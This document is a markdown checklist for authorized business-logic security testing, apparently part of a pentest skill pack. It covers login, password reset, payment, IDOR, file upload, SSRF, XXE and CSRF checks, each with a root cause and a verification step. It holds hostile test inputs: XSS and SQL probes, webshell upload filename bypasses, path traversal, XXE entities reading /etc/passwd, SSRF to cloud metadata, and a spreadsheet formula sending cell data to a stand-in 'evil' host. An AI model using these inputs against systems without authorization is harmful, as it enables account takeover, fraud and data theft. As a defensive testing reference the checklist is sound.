# Business Logic Vulnerability Checklist

> Companion to [SKILL.md](./SKILL.md), [SCENARIOS.md](./SCENARIOS.md), [METHODOLOGY.md](./METHODOLOGY.md). Distilled from instructor-led classes. Every entry has a **why** (root cause) and a **verify** (how to reproduce).

---

## 0. Compliance

| Item | why | verify |
|---|---|---|
| Written authorization obtained with clear scope, time window, data types | Law requires all testing within authorized scope | Check authorization letter; target system list |
| Test tools not "designed for intrusion" | Statute prohibits providing specialized intrusion tools | Tool source, purpose, whether listed as malware |
| No access/storage/transmission of real citizen PII during testing | Law prohibits illegal acquisition of personal info | Real-name tests use only test identities provided by authorizing party |
| Confirm before triggering integer overflow / resource exhaustion / high-concurrency bugs | Can cause service disruption, potential criminal liability | Secondary written confirmation + off-peak window |

---

## 1. Login Module

| Item | why | verify |
|---|---|---|
| Login interface rate-limits or bans on consecutive failures | Otherwise enumerable/credential stuffing | Burp Intruder: submit 5-10 wrong passwords, check for captcha/IP ban/account lock |
| Captcha has expiry (<=5 min) and is one-time | Otherwise brutable or replayable | Get captcha, wait for timeout then submit; or submit same captcha multiple times |
| Captcha not returned in plaintext in response | JSON `{"randm":9759,"code":0}` directly reveals OTP | Search response body for `code`/`randm`/`captcha` fields matching SMS content |
| No "universal captcha" allowed | Developer leftover `000000`/`123456` easily exploited | Try common universal codes in login or reset flow |
| Session ID must be reissued after login | Otherwise possible session fixation | Compare Cookie before/after login, check if SESSIONID changes |
| Cookie/Token has HttpOnly, Secure flags and no predictable sequence | Weak token can be enumerated or forged | DevTools check Cookie attributes; analyze token structure for plaintext uid/role |
| No empty password or bypassed "short-circuit" login | Missing validation allows arbitrary login | Submit `password=` empty value; submit `username=admin'/*` etc |
| Error messages uniformly vague on "user exists / doesn't exist" | Otherwise can enumerate users | Input known vs random users, compare response text, status code, timing |
| Third-party/SSO login callback strictly validates auth code and user ID binding | Callback only trusts passed user_id param = account takeover | In third-party login callback, change `uid`/`openid` to victim ID, check if logged into victim account |
| Login response `status`/`is_login`/`code` status flags cannot be rewritten by frontend to fake login state | Backend hasn't actually established session, frontend relies on response fields | Intercept response, change `success:false` to `true`, `is_login:0` to `1`, see if protected page loads |
| Biometric interface must include liveness detection, not accept static images/pre-recorded video | Only checking feature values without liveness attribute, replaceable with media | Submit legitimate user's static face photo/recording as camera stream, check if judged as live |
| Hardware key/USB-Key signature has expiry and one-time nonce | Otherwise old signatures can be replayed | Intercept legitimate signature request, replay old signature or modify device-id field |
| Login/registration `return_url`/`redirect`/`callback` uses domain whitelist | Otherwise arbitrary external site phishing | Change `return_url=https://evil.com`, check if response Location points externally |

---

## 2. Registration Module

| Item | why | verify |
|---|---|---|
| Backend independently validates image/SMS captcha; frontend validation is just UX | Skipping frontend = skipping validation | Burp intercept registration request, delete `verifycode` parameter, replay |
| SMS code strongly bound to phone number | Without binding can send to A and use B's code | Change `mobile=A` but `code=B's code`, check if succeeds |
| One email/phone cannot register twice | Lack of uniqueness leads to duplicate accounts | Register same email + different username multiple times; concurrent same-email registration |
| Registration interface prevents brute force (rate + image captcha + device fingerprint) | Used for bulk accounts | Script submitting different usernames per second, check if succeeds |
| Captcha/registration token not returned in response | Return allows bypassing verification | Check if response directly returns `randm`/`activation_token` |
| Public account/mini-program/internal interfaces also have captcha | "Only managed entrance" is high-risk | Try accessing H5 pages not exposed but present in App |
| Username/nickname field XSS filtered | Registering with XSS is classic stored type | Register with `<script>alert(1)</script>`, check profile page after login |
| Token/timestamp replay to bypass anti-duplicate not allowed | Otherwise can batch repeat registration | Replay same registration request with changed timestamp |
| After account cancellation, re-registering same username/email should not inherit old benefits | Cancellation flow doesn't fully clear associated data | Cancel account -> immediately re-register with same account, check order/balance/VIP status |
| Risk control covers "multiple similar virtual accounts bulk ordering" scenario | Risk control only targeting single account or single feature bypassed by multiple accounts | Register N accounts with different emails but same device/IP, concurrently execute bonus-claiming, check if blocked |
| Multi-step registration backend validates actual completion of previous steps | Otherwise attacker can POST directly to last step bypassing email/phone verification | Complete one normal registration capturing all requests, next time directly send "set password" step, check if succeeds |

---

## 3. Password Recovery

| Item | why | verify |
|---|---|---|
| Reset token not based on weak random number | Windows `rand()` max=32768 enumerable | Check if backend token generation is `md5(rand())`; locally brute 0~32768 full dictionary |
| Reset token one-time + short expiry | Otherwise can replay | After successful reset, use same token to change another password, check if still accepted |
| Reset flow "target user" determined by server session, not accepting request body replacement | Otherwise can change user_id to reset others' passwords | At step 4 of own reset flow, change `user_id` or `email` in request body to victim, check if succeeds |
| Captcha strongly bound to submitted phone number | Without binding can "receive code on own phone, change victim phone" to complete reset | Intercept and change `phone=victim`, `code=own received code`, check if passes |
| Old reset token immediately invalid after email change | Otherwise can "request token -> change email -> use old token to take over" | Request token, immediately change email, use old token, check if still valid |
| Modified link bound to current session/device | Otherwise can hijack reset cross-device | Request token on desktop browser, use on mobile, check if can complete |
| Each step in recovery flow strongly validates "previous step actually completed" (state machine) | Otherwise can skip verification step and go directly to change password | POST change password endpoint directly without verification step flags |
| SMS code not written in Cookie/response | See page 00020 type issue | Search response body for `"randm"`, `"verify_code"` |
| Reset token not just Base64 or other reversible encoding | Simple decode gives plaintext code | Intercept password reset response, do base64/url decode on suspicious fields, if plaintext then directly resetable |
| Cross-step tokens cannot be reused: email verification token cannot be used in phone verification step | Backend only validates token validity not binding to step | Get reset_token at step A, skip B/C, submit token at D (set new password), check if succeeds |
| Full password reset packet flow should be diff-analyzed to find missing validation | Different user/step request differences often expose token generation patterns | Use Burp Comparer to compare multiple reset request URLs, POST bodies, find if timestamp/UID/token is predictable |
| High-risk handling if reset_token/code appears in URL/HTML source/JS string | Directly exposed in frontend equals bypassing authentication | grep page source and JS files for `token`, `code`, `answer`, `reset_id` keywords |

---

## 4. Captcha Module

| Item | why | verify |
|---|---|---|
| Interface rate-limits per IP/phone/device per time unit | Otherwise SMS bombing | Burp Repeater: send 100 requests for same phone number, check if still sends each one |
| High concurrency cannot bypass rate limit | Simple counter has race condition | Burp Turbo Intruder `concurrentConnections=30`, send simultaneously, check if rate limit broken |
| Does not depend on Cookie/JSESSIONID to track "already sent" | Delete cookie = reset | Delete Cookie, replay, check if can succeed again |
| Phone field strictly trimmed + length validated | Trailing space, +86, /r/n etc can bypass | Submit `phone=13888888888 `, `phone=8613888888888`, `phone=13888888888\r\n` |
| Reject oversized phone numbers truncated by gateway | 12 digits truncated to first 11 still sends | Submit 12-digit number, check if SMS still sent |
| Captcha not echoed in response | See page 00020 | Search response body for digits matching SMS |
| Same captcha cannot be used multiple times | Otherwise replayable | Enter correct code, repeat submit N times, check if succeeds |
| Length sufficient (recommend 6+ digits) to prevent brute force | 4-digit pure number brutable in 5 minutes | Burp Intruder 0000~9999 full brute, calculate time |
| No "universal code" remains | See page 00008 | Try `000000`, `123456`, `888888`, `111111` |
| Deleting captcha parameter still rejected | Backend must validate parameter existence | Burp delete `captcha=` parameter, replay |
| Captcha bound to current session/account context, not accepting cross-account reuse | Only validates numeric value not session = can borrow | Request captcha in account A, enter in account B's next step, check if passes |
| Captcha immediately invalidated after one use, cannot "replay after valid use" | Missing one-time property allows replaying multiple operations | After one successful verification, submit same captcha again, check if still accepted |
| Receiving phone/email parameter cannot be rewritten in request body to attacker-controlled address | Send captcha interface doesn't validate request source matches recipient | Intercept "send captcha" request, change `phone`/`email` to attacker address, check if attacker receives captcha |

---

## 5. Payment and Recharge

| Item | why | verify |
|---|---|---|
| Server independently validates amount (doesn't trust frontend `amount`/`total_price`) | Classic frontend-controllable parameter | Intercept and change `amount=0.01`/`amount=-100`, check if order takes effect |
| Payment status written by backend from gateway callback, not accepting client `payment_status=paid` | See page 00005 | Change `payment_status=paid`, `is_paid=1`, check if order marked complete |
| Quantity field must be positive integer | `quantity:-1`/`quantity:0.02` both constitute vulnerabilities | `skuQty:0.02`, `FoodNum:0.01` |
| Quantity field has upper limit to prevent integer overflow | int32 max+1 = -2147483648 | Submit `quantity=2147483648`, check for wraparound |
| Coupon face value cannot be negative or greater than product price | `coupon_amount=-100` adds instead; `coupon_amount > price` = free | Intercept and modify coupon field |
| Even if frontend shows "payment failed", order amount must equal product price | Order may already be created, can use wallet to pay remaining | After changing coupon, check order details, try wallet payment |
| Payment interface name/channel uses whitelist validation | Otherwise replacing with non-existent interface can "succeed" | Change `payment_method=invalid_chan`, check response |
| Trial interface and purchase interface completely isolated | Otherwise "trial URL changed to purchase" gets free VIP | Change URL end `4` (trial) to `3` (purchase), check if still free |
| Payee `username`/`account_id` determined by server session | Otherwise can replace with victim to charge them | Change `username=victim`, check if charges other user's balance |
| Recharge amount precision not eaten by rounding | 0.019 yuan only deducts 0.01 but wallet adds 0.02 | Recharge 0.019, check actual deduction vs wallet change |
| Server uses integers (cents) not floats | Float rounding is root cause of precision vulnerabilities | Check if response amounts are `1.99`/`199` |
| Payment callback: signature + timestamp + source IP triple validation | Otherwise can forge success notification | Capture real callback, locally forge and resend |
| Callback interface idempotent | Otherwise replay can trigger multiple shipments | Replay same callback request N times, check order status change / multiple shipments |
| Shopping cart locked after payment complete | Otherwise can "pay then add to cart, ship per new cart" | Stay on payment page, open another tab to add items, complete payment, check actual shipment |
| User/order replacement attack protection | Multiple orders' payment notifications must strictly bind transaction_id | Simultaneously place large and small orders, use small amount payment notification to confirm large order |
| Multi-device concurrent subscription doesn't get new user discount | Server must lock user state | Multiple phones simultaneously enter new user discount payment page, complete in sequence |
| Limited-time activity uses server time, doesn't trust frontend timestamp | Otherwise change time to bypass | Change `time` parameter to time outside activity period |
| Key fields have server-side signature/HMAC, signature covers ALL parameters affecting amount | Otherwise unsigned indirect fields (quantity, discount) changes still take effect | Compare normal vs tampered requests, find unsigned fields |
| Mobile does not hardcode RSA private key/MD5 key | Decompilation can extract, forge signature | jadx decompile APK, search `md5`, `RSA`, `SecretKey` strings |
| Currency code `currency` and amount jointly validated, doesn't accept switching to lower exchange rate currency | Backend doesn't recalculate exchange rate, directly deducts by number | Change `currency=CNY` to `currency=JPY/RUB/INR`, keep amount same, check actual deduction |
| Shipping/handling/discount "non-product amount" fields must be positive validated | `shipping_fee=-500` directly offsets payable amount | Intercept order request, change shipping/handling/discount fields to negative, check if total reduced |
| "Edit/exchange/supplement" interface after order creation must re-query current product price | Otherwise can create normal order then change SKU to lower-priced product | Create order -> call edit interface to change product ID to lower-priced product -> complete payment, check actual deduction |
| After refund/cancellation all virtual benefits (points, VIP, service, coupon reuse) must be simultaneously recovered | Business loop missing, benefits not revoked after refund | Run "purchase -> use -> refund" three steps, check if points balance, VIP level, coupon status restored |
| Payee/merchant/withdrawal account field determined by server session, not accepting request body replacement | Attacker can change receiver_account to transfer funds to own account | Intercept withdrawal/transfer request, change `receiver_account`/`merchant_id` field, check fund destination |
| One successful payment can only trigger one shipment/one recharge credit | Missing idempotency "simulated payment success callback" can get N free | Capture real payment success callback or confirmation request, high-frequency replay in Burp Repeater, check if stock/balance changes multiple times |
| System has volume risk control for "profit 0.001 yuan, but 1M daily calls" type micro-profit exploitation | Single difference small but cumulative large | Estimate single difference + interface frequency + daily limit, calculate cumulative obtainable profit |

---

## 6. Coupons / Points / Gift Cards

| Item | why | verify |
|---|---|---|
| Single coupon one-time + status bound to order | Otherwise coupon still active after order closed, reusable | Create order -> close -> reorder, check if coupon still usable |
| Same coupon cannot be concurrently applied to multiple orders | Race condition | Burp Repeater Group "Send in parallel" submit 20 same coupon applications |
| Coupon value range strictly validated | Prevent `value=-100`, `value=999999` | Intercept and change face value |
| Array-form submission of multiple coupons rejected | `couponid[0]=A&couponid[1]=B` is common bypass | Change request to array form |
| Points deduction value has upper limit and >=0 | Otherwise can negative value reverse-add points | Change `points=-1000` |
| Invitation codes do not form self-loops/infinite chains | Create throwaway email account -> mutual invite -> infinite rebate | Create accounts A, B, C mutual referral codes, check if rebates credited |
| Gift card/redemption code concurrent redemption rejected | Classic double-spend scenario | Burp parallel replay redemption request |
| Lottery count/probability not controllable by frontend | See page 00009 type | Intercept and change `chance_count`, `prize_id` |

---

## 7. Order and Shopping Cart

| Item | why | verify |
|---|---|---|
| Total amount recalculated server-side as unit price x quantity, doesn't trust frontend `total` | Otherwise change total to pay anything | Intercept and modify `total_amount`, check actual deduction |
| Quantity as negative/0/float all rejected | See pages 00011/00012 | `quantity=-1`, `quantity=0`, `quantity=0.02` |
| Correct concurrent handling when inventory is 0/near 0 | Prevent overselling | Multi-thread simultaneously purchase only 1 item left |
| Order state machine only allows legal transitions | Otherwise can PUT `status=paid`/`refunded`/`shipped` directly | Directly call status change API |
| Cannot roll back from shipped/completed order to pending payment | Otherwise can "cancel shipped order for refund" | Try to change status backward |
| Order ID not enumerable (UUID not auto-increment) | Otherwise iterate to see others' orders | Increment `order_id=1..N`, check if can get others' order data |
| Order detail interface independently validates ownership (not just on ID) | IDOR | Use A token to access B's order ID |
| Same order cannot be concurrently submitted for payment | Otherwise double-spend | Concurrently submit same cart_id, check if multiple deductions generated but only one received |
| Return/refund cannot skip merchant review | See page 00009 | Directly call refund API without going through review |
| Receipt confirmation bound to real delivery address/user confirmation | Otherwise can bypass auto-confirmation | Directly call confirm-receipt interface |

---

## 8. IDOR / Privilege Escalation

| Item | why | verify |
|---|---|---|
| All APIs use Filter/middleware for unified authentication (not just frontend hiding entry) | Common Java Web flaw: only Servlet page jump without Filter, all non-login pages accessible without auth | Delete Cookie, directly access `/api/*`, check if data still retrievable |
| Resource ID must validate ownership, not just check "logged in" | Classic horizontal privilege escalation: post-login interface takes ID without ownership check | Use account A to access account B's user_id resource |
| Role field (role/level) not modifiable in cookie/request body | base64 cookie `uid=admin1` | Change cookie uid/role field, replay |
| RBAC data consistency: UI deleting permission should not leave duplicate rows in database sys_menu | Common backend business logic flaw: sys_menu duplicate rows cause permission cancellation not truly effective | After canceling user's permission, check if sys_menu table still has that record |
| Cookie replacement cannot get admin data | Capturing admin Cookie and using for regular user = privilege escalation, classic cookie replacement attack | Capture admin packet, regular account replay with admin Cookie |
| `/admin/*` path Filter uses `request.getServletPath()` not `getRequestURI()` | `getRequestURI` doesn't normalize paths, semicolon truncation invalidates check | Try `/admin/;/login` to see if bypassed |
| Path `..//` cannot truncate Filter | `/FilterDemo/../../index.jsp` truncation bypass is classic Servlet flaw | Submit `/admin/../../home`, `/admin/..%2F..%2F`, check response |
| Backend URL not exposed/not enumerable | Backend entry directly accessible (e.g., `main.php`) = unauthorized access | Try common paths `admin.php`, `/admin`, `/manage` |
| Spring Security antMatchers configuration fully covers all paths | `.antMatchers("/system/menu/**").hasRole("admin")` only matches prefix, missing interface path = unauthorized | grep `@PreAuthorize`, `@RequestMapping`, compare with configuration |
| All "admin-visible data" interfaces check requesting user's role | Prevent vertical privilege escalation | Use user token to call admin API |
| Third-party/internal interfaces must authenticate | `/api/internal/*` exposure = unauthorized | nmap/dirsearch probe internal interfaces |
| Host collision doesn't expose internal assets | `host_scan.py` collision reveals injection/upload/privilege escalation | `python3 host_scan.py -d target.com -t 100` |
| Email/phone change interface must first verify old binding credential (old password/old email code/old phone code) | Skipping original validation directly `new_email=attacker` = account takeover | Intercept "change email/phone" request, remove old credential field or leave empty, check if still allows change |
| UID and session token consistency check: forbid token belonging to A with request body uid=B | Backend only checks uid not token ownership = horizontal privilege escalation | Keep A's Cookie/Token unchanged, change `uid` in request body to B, check if returns B's data |
| Multiple entry points (Web, App, mini-program, external API) have consistent permission policies | Web blocks/App doesn't = alternative entry bypass | Test same restricted functionality on different platforms, compare permission checks |
| Group/social management operations (kick, mute, pin) server validates "operator identity vs target relationship" | Otherwise can modify target_uid to operate on non-group members or group owner | Intercept kick request, change `target_uid` to group owner or non-group member, check if succeeds |
| Upgrade/downgrade benefits completely switches old/new role permissions with no residual RBAC data | Role update logic only adds doesn't delete = permission pollution | After user downgraded from admin to user, immediately call admin API, check if still accessible |
| Hidden share link ID/gift ID/activity ID must be randomized or have access ACL | Numeric incrementing can enumerate others' private itineraries or resources | Get one valid ID, use Intruder to numerically enumerate nearby IDs, check if other users' data accessible |

---

## 9. Real-Name & Privacy

| Item | why | verify |
|---|---|---|
| After real-name authentication, auth status locked, cannot "intentionally fill wrong info then re-edit" | See page 00029: intentionally fill wrong ID -> rejected -> reset entry | Submit real-name auth with wrong ID card, after rejection check if can still edit identity info |
| After submitting wrong ID N times, automatically locked or requires manual review | Otherwise can replay to bypass anti-addiction | Submit 5 different wrong ID cards consecutively, check if risk-controlled |
| Server response cannot trust frontend success field | See pages 00022/00023: change `success:true` to bypass password validation for phone change | Burp change response `success:false -> true`, check if frontend flow continues |
| Must verify old credential before changing phone/email (password or old phone captcha) | Missing check allows direct takeover | Submit modification interface without verification field |
| Personal profile fields cannot be modified for others across accounts | Change user_id to modify others' profile | Intercept and change `user_id=victim`, check if succeeds |
| Avatar/file upload strict type validation + sandbox | Prevent webshell + XXE | Upload `.php`/`.jsp`, upload docx containing `<!ENTITY>` |
| Data desensitization consistent across interfaces | Case A shows `138****5678`, B shows `1384***5678`, C shows `13845**678`, combination can reconstruct | List all interfaces leaking same field, compare masking methods |
| Sensitive fields not returned in full in response | User info query returns full password/id_card text | Capture login/profile query response, search `password`, `ID card` |
| Interface enumeration has rate limit + behavior analysis | Prevent ID card number brute force (page 00027: different status codes 501/531 reveal validity) | Burp enumerate with incrementing ID card numbers, check response differences (length/code) |

---

## 10. VIP / Subscription / Resource Access

| Item | why | verify |
|---|---|---|
| Resource links (video/audio/course files) must have server-side auth, cannot give direct links in response | See pages 00031/00032/00033: capture shows `previewPullUrl: ...flv` direct download VIP resource | Capture detail interface response, search `.flv`, `.mp4`, `.m3u8`, `url`, copy to VLC or flv.js demo to play |
| Replacing free course ID with paid course ID cannot bypass payment check | Classic IDOR scenario | Capture free course interface, replace ID with paid course ID, check if same content returned |
| Direct links have short-term signature + Referer + IP check | Simple link public still shareable | Copy link to no-Referer environment (curl), check if downloadable |
| VIP duration upgrade supports idempotency to prevent duplication | Multi-device concurrent price-difference upgrade locked | Multiple devices simultaneously click "pay price difference upgrade", complete payment, check if VIP duration multiplies |
| Trial -> purchase flow isolated | Trial interface change to purchase = free | URL end `/4` changed to `/3`, check if still at trial price |
| After member downgrade, premium API immediately rejected | UI hidden != backend rejected | Upgrade then call premium interface OK, immediately downgrade then call, check if still 200 |
| VIP level field not changeable in request body | `vip_level=99` change cookie or request body | Intercept and modify corresponding field |

---

## 11. URL Redirect / SSO / Third-Party Systems

| Item | why | verify |
|---|---|---|
| Redirect parameter uses whitelist or path-only | Otherwise arbitrary URL redirect phishing | `?url=https://evil.com`, check if redirects |
| Validation must cover encoding bypasses | `?`, `@`, `/`, `#`, subdomains, malformed URLs, IP direct connection, etc. | Submit `https://target.com@evil.com`, `https://target.com.evil.com`, `https://evil.com/?target.com`, `https://evil.com#target.com` |
| OAuth callback address bound to client not user input | Otherwise arbitrary callback can get token | Change `redirect_uri=evil.com`, check if token issued |
| Webhook callback: signature + timestamp + IP whitelist | Otherwise can forge payment/subscription events | Locally forge callback, POST directly to `/webhook/*` |
| Third-party account interfaces authenticated | See page 00007: third-party system unauthorized | Delete cookie, access /third/api/* |
| Third-party application version has no known CVEs | Old component versions | wappalyzer/banner grab to check version |

---

## 12. Cookie / Token / Session

| Item | why | verify |
|---|---|---|
| Cookie set `HttpOnly`, `Secure`, `SameSite=Lax+` | Prevent XSS stealing cookie | DevTools check Cookie attributes |
| Token not predictable/enumerable (recommend >=128 bit random) | Weak random = enumerable | Get multiple tokens, compare for patterns (auto-increment/timestamp+short salt) |
| Token has reasonable expiry + single device/endpoint binding | Otherwise one stolen token = permanent control | Use same token after 7 days, or multiple device login check if mutually kicked |
| All old tokens immediately invalid after password change | Otherwise changing password is meaningless | Login on device A, change password on device B, check if A is kicked |
| Cookie doesn't hold critical business state fields | Don't put `is_paid=1` in cookie | Capture cookie, check if contains `role`/`is_paid`/`vip` |
| Changing cookie fields cannot affect permissions | See page 00017 type issue | Change `JSESSIONID`, `uid`, check response changes |
| Resetting cookie doesn't reset server-side captcha counter | Otherwise delete cookie = unban | Delete cookie, request captcha again, check if succeeds again |
| Token cannot be generated from client-controllable info (username + timestamp) via weak algorithm | `md5(username+timestamp)` type is classic forgery point | Get tokens for multiple different accounts/times, locally generate with same algorithm, replace and access protected resources, check if succeeds |
| Old token globally invalid within 5 seconds after logout/password change/binding change | Otherwise expired credentials can still call sensitive interfaces | Old device sends request -> new device logs out -> old device sends again, check if rejected |
| One-time token/nonce/CSRF token immediately invalidated after first successful use | No invalidation = can replay sensitive operations | Capture request with one-time token, submit twice, check if second rejected |
| Token triggers risk control when used across devices/IPs (abnormal login prompt or forced re-authentication) | No context binding = stolen token globally usable | Login on device A to get token, use same token from device B/different IP/different UA to call sensitive interface, check if rejected |

---

## 13. Race Condition (Cross-Cut)

> For any checklist item with "one-time success", ask again: **can concurrent requests break through?**

| Scenario | Test Method |
|------|--------|
| One-time coupon | Repeater Group `Send in parallel` apply 20 times simultaneously |
| Gift card balance deduction | Turbo Intruder concurrentConnections=30 |
| Limited purchase "one per person" | Multiple accounts/IPs simultaneously claim |
| Rate-limited SMS code | concurrentConnections=30, requestsPerConnection=10 |
| Multi-device concurrent member upgrade | See checklist page 00012 |
| Same email concurrent registration | Expect "uniqueness constraint effective", otherwise dual account |
| Same cart concurrent checkout | Double-spend |

Reference script:

```python
# Burp Turbo Intruder template
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```

---

## 14. Comment / Third-Party Inputs

| Item | why | verify |
|---|---|---|
| Comment fields use parameterized SQL + XSS filtering | POST/Cookie injection + comment XSS | Submit `'`, `<script>` |
| Comments require token/session validation to prevent CSRF | Otherwise can forge comments | Delete referer/token then submit |
| Cannot enumerate comment user IDs to get user info | IDOR | Change `userid=N`, check if user info leaked |
| Comment rate limit + risk control | Prevent comment flooding | High-frequency submission, check if blocked |

---

## 16. File Upload Business Logic

> Only for upload business logic validation. Webshell/parsing vulnerabilities/sensitive file reading exploitation chains: also load `upload-insecure-files/SKILL.md`.

| Item | why | verify |
|---|---|---|
| Upload file validated by "file signature/magic bytes", not relying on `Content-Type` and extension | Only checking MIME/extension can be bypassed by packet modification | Intercept upload request, change `Content-Type` to `image/jpeg`, body is PHP content, check if uploaded successfully and executable |
| Extension validation rejects double extension, mixed case, dot truncation, `;` truncation, null byte | `.php.jpg`, `.Php`, `.php.`, `.php;.jpg`, `.php\x00.jpg` all common bypasses | Try `shell.php.jpg`/`shell.Php`/`shell.php%00.jpg`/`shell.php;a=1` each |
| Filename normalized, disallow `..`/absolute path/control characters | `filename=../../webshell.php` writes to root directory | Intercept upload request, change `filename` to `../../webshell.php`, check landing path |
| Upload file landing path not controllable by frontend fields | Otherwise directly overwrite arbitrary path files | Check if request contains `path`/`dir`/`category` fields, try changing to paths outside business scope |
| Upload file storage path not enumerable or cross-user overwritable | `/uploads/UID/filename` knowing UID can hit it | A uploads `a.png`, B uploads with same filename, check if overwrites A or writes to A's path |
| Server parsing/converting images in sandbox with version control | ImageMagick/FFmpeg/Pillow all have RCE history | Upload JPG with malicious EXIF/payload to trigger known CVE, check server reaction |
| Office/OOXML/PDF upload must repackage-detect: xml validity + dangerous node (DDE, macro, external link) stripping | docx is essentially ZIP, repackage-inject malicious XML bypasses surface validation | Unzip `.docx`, modify `[Content_Types].xml` to inject external entity/DDE, repackage and upload |
| XML/DTD/SVG upload uses dedicated parser with external entities disabled | Otherwise direct XXE upload | Upload SVG/docx containing `<!ENTITY x SYSTEM "file:///etc/passwd">`, check response or OOB log |
| Decompression interface must limit single-file expanded size and zip-bomb | 1KB -> 1GB DoS | Upload a `42.zip` type compression bomb, monitor server CPU/disk |
| CSV/XLSX content filtered for formula injection (=, +, -, @ starting) | `=SYSTEM("calc")` executes in Excel macro environment | Submit `=cmd|'/c calc'!A1`, `=HYPERLINK("http://evil/?"&A1, "click")`, check downloader's actual behavior |
| High concurrency upload doesn't have "uploading" window to bypass antivirus scan | Under high concurrency AV can't scan in time, malicious file briefly accessible | Burp Intruder concurrent upload same malicious file and concurrent request that URL, check if execution window caught |
| Upload interface also has rate limit and identity verification | Internal/backend upload is main webshell path | Delete cookie/use low-privilege account to try uploading, check if rejected |

---

## 17. CSRF / SSRF / XXE / Out-of-Band / Network Logic

| Item | why | verify |
|---|---|---|
| XML parser disables external entities/DTD loading/parameter entities | Otherwise one `<!ENTITY x SYSTEM "file:///etc/passwd">` = arbitrary file read | Body inject XML containing `<!DOCTYPE>` and `SYSTEM` entity, check if response echoes `/etc/passwd` |
| XXE blind injection: no response echo doesn't mean doesn't exist; OOB channel still possible | No echo != doesn't exist; OOB can still exfiltrate data | Configure DTD in Burp Collaborator/DNSLog, construct parameter entity -> monitor if target makes outbound connection |
| Any "import URL/fetch image/Webhook callback/preview link" interfaces disable `file://`/`gopher://`/`dict://`/`jar://`/`php://` protocols | Otherwise SSRF full suite: read local files, attack intranet, command execution | Change URL to `file:///etc/passwd`, `gopher://127.0.0.1:6379/_INFO`, `http://169.254.169.254/`, check response or OOB |
| URL input does "DNS resolve + post-resolution validation", forbid resolving to internal IP/reserved ranges | String-only matching can be bypassed by DNS rebinding or `127.0.0.1.nip.io` | Use `http://attacker.tld` (A record pointing to 169.254.169.254) for SSRF, redirect to intranet, check if connected |
| Redirect-following URLs also go through SSRF validation, cannot "first hop legitimate -> 302 -> intranet" | Most SSRF established through 302 relay | Attacker domain returns `302 Location: http://127.0.0.1:8500/`, check if target follows |
| State-changing interfaces (payment, withdrawal, password change, email change, data deletion) have Anti-CSRF Token + SameSite + Origin/Referer triple protection | Missing any = malicious page can silently trigger | Write attacker.html with auto-submit form pointing to target interface, access while logged into browser, check if triggered |
| Webhook/payment callback/third-party notification interface validates signature + timestamp + source IP whitelist | Otherwise can locally forge payment success notification | Capture real callback request, locally modify order number/amount, POST directly to callback URL, check order status |
| JSONP callback and cross-origin read interfaces don't return sensitive user data | JSONP can be fetched cross-origin via `<script>` -> bypasses SOP | On attacker page use `<script src="https://target/api/jsonp?cb=x">`, check if user data accessible |
| Outbound request exit uses "whitelist + egress firewall" policy | Internal assets can be reached via cloud metadata/internal middleware | Use `http://169.254.169.254/latest/meta-data/` (AWS)/`http://metadata.google.internal/` to probe cloud metadata |
| Blind injection vulnerabilities daily audit standard includes OOB platform (DNSLog/Collaborator/interactsh) | Relying only on echo misses blind spots | Inject payload embedded with random subdomain, monitor if that domain is resolved |

---

## 15. Methodology Summary

Every project runs at minimum two rounds:

1. **Round 1**: Top-to-bottom complete run of sections 0~14, try each item, check off.
2. **Round 2**: Take the red flags (suspected vulnerabilities) from round 1 to METHODOLOGY.md review, run business-side verification for each (did VIP actually increase? was money actually charged to someone else? was data actually returned that shouldn't be?).

Report ordering by "business impact > technical detail": financial loss/account takeover/privacy leak -> privilege escalation/info disclosure -> DoS/UX flaws.

---

## References

- [METHODOLOGY.md](./METHODOLOGY.md) - Five-phase methodology / single-page decision tree
- [SKILL.md](./SKILL.md) - Business logic vulnerability attack playbook
- [SCENARIOS.md](./SCENARIOS.md) - Payment/race condition/password recovery/enumeration/upload detailed scenarios
